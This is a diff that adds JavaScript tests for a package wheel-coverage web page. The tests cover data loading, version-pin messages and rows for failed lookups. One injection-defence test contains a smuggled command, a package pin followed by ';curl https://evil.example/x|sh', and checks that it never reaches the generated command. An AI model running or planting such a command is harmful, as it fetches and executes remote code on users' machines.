@@ -245,6 +245,8 @@ async function loadPage(hash) {
     if (get("platform-leaderboard").innerHTML) break;
     await new Promise((r) => setImmediate(r));
   }
+  assert.doesNotMatch(get("meta").textContent, /Couldn't load/, "the page loaded its data");
+  assert.ok(get("platform-leaderboard").innerHTML, "the platform cards rendered");
   return { get, context };
 }
 
@@ -291,4 +293,39 @@ test("pure Python packages are described as shipping a pure Python wheel, not as
   const page = await loadPage("");
   for (const id of ["pure-note", "kpi-pure-pct"]) assert.doesNotMatch(page.get(id).textContent, /everywhere|anywhere/, id);
   assert.match(page.get("pure-note").textContent, /ship a pure Python wheel/);
+});
+
+test("the instant checker says when a pinned version isn't the release the scan checked", async () => {
+  const top = coverage().packages[0];
+  const page = await loadPage(`#package=${top.name}==0.0.1`);
+  page.get("search").value = `${top.name}==0.0.1`;
+  vm.runInContext("renderOmniAnswer()", page.context);
+  const html = page.get("omni-answer").innerHTML;
+  assert.match(html, /The scan checks the latest release/);
+  assert.match(html, new RegExp(`uvx wheelgap ${top.name}==0\\.0\\.1 -p `));
+});
+
+test("a package whose lookup failed isn't described as building from source in its expanded row", async () => {
+  const data = coverage();
+  const python = data.targets[0].python;
+  const at = data.targets.findIndex((t) => t.python === python && t.platform === "musl-aarch64");
+  const errored = data.packages.find((p) => p.results[at] === "unknown");
+  if (!errored) return; // nothing to check in this snapshot
+  const page = await loadPage(`#python=${python}&platform=musl-aarch64`);
+  vm.runInContext(`state.expandedPkg = ${JSON.stringify(errored.name)}; state.pageSize = "all"; renderGaps();`, page.context);
+  const html = page.get("gaps").innerHTML;
+  const row = html.slice(html.indexOf("gap-inline-row"));
+  assert.match(row, /unknown/);
+  assert.doesNotMatch(row.slice(0, row.indexOf("</tr>")), /builds from source/);
+});
+
+test("an invalid pin never reaches the checker's command (#57)", async () => {
+  const top = coverage().packages[0];
+  const evil = `${top.name}==1.0;curl https://evil.example/x|sh`;
+  const page = await loadPage(`#package=${encodeURIComponent(evil)}`);
+  page.get("search").value = evil;
+  vm.runInContext("renderOmniAnswer()", page.context);
+  for (const id of ["omni-answer", "omni-minimized-summary", "lookup"]) {
+    assert.doesNotMatch(page.get(id).innerHTML, /evil\.example/, id);
+  }
 });
